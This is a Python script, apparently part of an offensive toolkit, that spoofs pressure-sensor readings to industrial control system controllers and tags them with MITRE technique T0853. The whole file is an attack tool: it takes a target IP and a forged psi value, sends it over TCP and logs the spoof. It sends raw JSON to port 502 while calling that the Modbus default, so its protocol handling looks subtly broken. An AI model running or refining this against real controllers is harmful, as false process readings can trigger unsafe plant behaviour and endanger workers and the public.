#!/usr/bin/env python3
# modules/attacks/pressure_sensor_spoofer.py

import argparse
import socket
import json
import os
from datetime import datetime

LOG_FILE = "results/pressure_spoof_log.json"
MITRE_TTP = "T0853"

def log_spoof(ip, value):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "spoofed_pressure": value,
            "ttp": MITRE_TTP
        }) + "\n")

def send_spoofed_pressure(ip, port, value):
    try:
        payload = json.dumps({"sensor": "pressure", "psi": value}).encode()
        s = socket.socket()
        s.connect((ip, port))
        s.sendall(payload)
        s.close()
        log_spoof(ip, value)
        print(f"[✓] Spoofed pressure {value} psi sent to {ip}:{port}")
    except Exception as e:
        print(f"[!] Spoof failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof pressure sensor values to ICS controllers")
    parser.add_argument("--ip", required=True, help="Target controller IP")
    parser.add_argument("--port", type=int, default=502, help="Port (default Modbus: 502)")
    parser.add_argument("--psi", type=float, required=True, help="Spoofed pressure in psi")
    args = parser.parse_args()

    send_spoofed_pressure(args.ip, args.port, args.psi)
